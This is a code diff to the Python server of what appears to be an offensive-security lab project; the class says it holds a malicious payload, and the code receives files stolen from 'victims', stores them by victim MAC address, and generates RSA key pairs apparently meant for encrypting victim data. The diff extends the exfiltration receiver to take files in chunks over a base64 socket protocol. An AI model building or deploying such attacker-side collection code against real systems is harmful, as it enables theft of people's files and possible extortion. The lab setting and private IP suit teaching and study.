@@ -12,7 +12,8 @@ import subprocess
 import errno
 import time
 from getmac import get_mac_address
-import rsa
+#from io import BytesIO
+#import rsa
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -21,7 +22,7 @@ class Server:
    
     FORMAT = 'utf-8'
     IP_ADDR = '192.168.56.110'
-    MAX_SIZE = 1024
+    MAX_SIZE = 4096
     VICTIMS = []
     WORKING_DIR = '/home/attacker/Lab-On-Offensive-Attack/VictimsData'
     CODE_PATH = '/home/attacker/Lab-On-Offensive-Attack/mal.py'
@@ -69,15 +70,19 @@ class Server:
     def generate_key_pair(self):
         public_key, private_key = rsa.newkeys(2048)
 
-        with open(Server.WORKING_DIR + '/public.pem', 'wb') as f:
+        with open(os.path.join(Server.WORKING_DIR , 'public.pem'), 'wb') as f:
             f.write(public_key.save_pkcs1('PEM'))
 
-        with open(Server.WORKING_DIR + '/private.pem', 'wb') as f:
+        with open(os.path.join(Server.WORKING_DIR, 'private.pem'), 'wb') as f:
             f.write(private_key.save_pkcs1('PEM'))
 
     def receive_victim_files(self, conn, mac):
-        path = os.path.join(Server.WORKING_DIR, mac)
+        print("begin")
+        path = os.path.join(Server.WORKING_DIR, mac)   
         filename = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+        print(filename)
+        data_file = ""
+        size = 0
 
         if "DONE." in str(filename):
             self.TRANSFER_DONE = True
@@ -85,13 +90,26 @@ class Server:
         
         file_loc = os.path.join(path, filename)
         print("[RECV] Receiving the filename.")
+        #try:
         file = open(file_loc, "w")
         conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))
+        while "FILEDONE" not in data_file :
+            data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT, errors="ignore")
+            print("[RECV] Receiving the file data.")
+            file.write(data_file)
+            conn.sendall(base64.b64encode("File data received.".encode(Server.FORMAT)))
+            size+=len(data_file)
+            print("size: "+str(size))
 
-        data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
-        print("[RECV] Receiving the file data.")
-        file.write(data_file)
-        conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))
+        #except ValueError:
+            #with BytesIO(filename) as f:
+            #    file = open(str(f.name).split(chr(92))[-1], "w")
+            #    print(str(f.name).split(chr(92))[-1])
+            #    file.write(f.read())
+        #    return
+
+        print("file data: "+data_file)
+        conn.sendall(base64.b64encode("FILEDONE RECEIVED".encode(Server.FORMAT)))
 
         file.close() 
 
@@ -114,24 +132,21 @@ class Server:
                         else:
                             raise
 
-
-                    #priv, pub = self.generate_key_pair()
-
-                    #self.make_dir('Keys')
+                    #self.generate_key_pair()
                     
-                    #command to save the private and public key in /home/attacker/Lab-On-Offensive-Attack/VictimsData
-
-                    #key_name = base64.b64encode('keyname'.encode(SERVER.FORMAT))
+                    #key_name = base64.b64encode('public.pem'.encode(SERVER.FORMAT))
                     #connection.sendall(key_name)
 
-                    #key = base64.b64encode('key file'.encode(SERVER.FORMAT))
+                    # file = open(os.path.join(Server.WORKING_DIR, key_name), "rb")
+                    # key_data = file.read()
+                    #key = base64.b64encode(key_data.encode(SERVER.FORMAT))
 
                     #connection.sendall(key)
-                    generate_key_pair(self)
 
                     while not self.TRANSFER_DONE:
-                        self.receive_victim_files(connection)
+                        self.receive_victim_files(connection, victim_mac)
                         if self.TRANSFER_DONE == True:
+                            print("yessss")
                             break
                     break
                     
